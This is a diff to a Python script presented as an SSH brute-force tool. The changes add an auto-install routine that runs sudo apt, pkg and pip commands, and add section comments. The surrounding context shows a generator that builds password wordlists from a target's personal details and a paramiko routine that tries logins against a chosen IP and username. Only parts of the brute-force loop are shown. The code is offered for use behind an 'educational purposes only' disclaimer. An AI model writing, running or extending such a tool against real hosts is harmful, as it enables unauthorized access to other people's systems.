@@ -2,35 +2,58 @@
 SSH Brute Force Automation Tool with Custom and Strong Wordlist Generator
 Author: p4cket-hunt3r (https://github.com/p4cket-hunt3r)
 For Ethical Hacking Educational Purposes Only
-if anyone use this for illegal purpose admin don't take responsbility
 """
 
-import time
 import os
 import sys
+import time
 import random
 import string
+import shutil
+import platform
 
-# Step 0: Auto-install required module
+# -------------------------------
+# Step 0: Auto-fix build errors (Rust, pip tools, etc.)
+# -------------------------------
+
+def install_requirements():
+    print("\n[+] Checking and Installing Required Packages...")
+
+    # Check if Rust is needed (common for Termux and newer Python versions)
+    if shutil.which("pkg"):
+        print("[+] Detected Termux. Checking Rust...")
+        os.system("pkg install rust -y")
+    elif shutil.which("apt"):
+        print("[+] Detected Linux (APT based). Checking Rust...")
+        os.system("sudo apt install rustc -y")
+
+    # Upgrade pip, setuptools, wheel
+    print("[+] Upgrading pip, setuptools, and wheel...")
+    os.system(f"{sys.executable} -m pip install --upgrade pip setuptools wheel")
+
+    # Finally install paramiko
+    print("[+] Installing paramiko module...")
+    os.system(f"{sys.executable} -m pip install paramiko")
+
 try:
     import paramiko
 except ImportError:
-    print("[+] Installing required Python module: paramiko")
-    os.system(f"{sys.executable} -m pip install paramiko")
-    import paramiko
+    install_requirements()
+    try:
+        import paramiko
+    except ImportError:
+        print("[-] Failed to install paramiko. Please check Python and pip installation.")
+        sys.exit()
+
+# -------------------------------
+# Step 1: Wordlist Generation
+# -------------------------------
 
 def generate_random_password(length=12):
-    """
-    Generate a strong random password (Google-style)
-    """
     chars = string.ascii_letters + string.digits + string.punctuation
     return ''.join(random.choice(chars) for _ in range(length))
 
 def generate_wordlist(output_file):
-    """
-    Generate a target-specific wordlist with user-selected options.
-    """
-
     print("\n[+] Wordlist Generation - Target Specific")
 
     name = input("Target Full Name: ").strip()
@@ -86,12 +109,11 @@ def generate_wordlist(output_file):
     print(f"[+] Wordlist saved as: {output_file}")
     print("[+] Total passwords generated:", len(password_list))
 
+# -------------------------------
+# Step 2: SSH Brute Force Logic
+# -------------------------------
 
 def ssh_bruteforce(target_ip, username, wordlist_file):
-    """
-    Attempt SSH brute force using the generated wordlist.
-    """
-
     print("\n[+] Starting SSH Brute Force Process...")
 
     client = paramiko.SSHClient()
@@ -120,6 +142,9 @@ def ssh_bruteforce(target_ip, username, wordlist_file):
 
     print("\n[-] Brute Force Completed. Password not found in wordlist.")
 
+# -------------------------------
+# Step 3: Main Program Start
+# -------------------------------
 
 if __name__ == "__main__":
     print("\n==== SSH Brute Force Automation Tool ====")
@@ -134,4 +159,4 @@ if __name__ == "__main__":
     ssh_bruteforce(target_ip, target_username, wordlist_file)
 
     print("\n==== Process Completed ====")
-    print("This tool is for ethical hacking education and authorized testing only.")
+    print("This tool is for educational use on authorized systems only.")
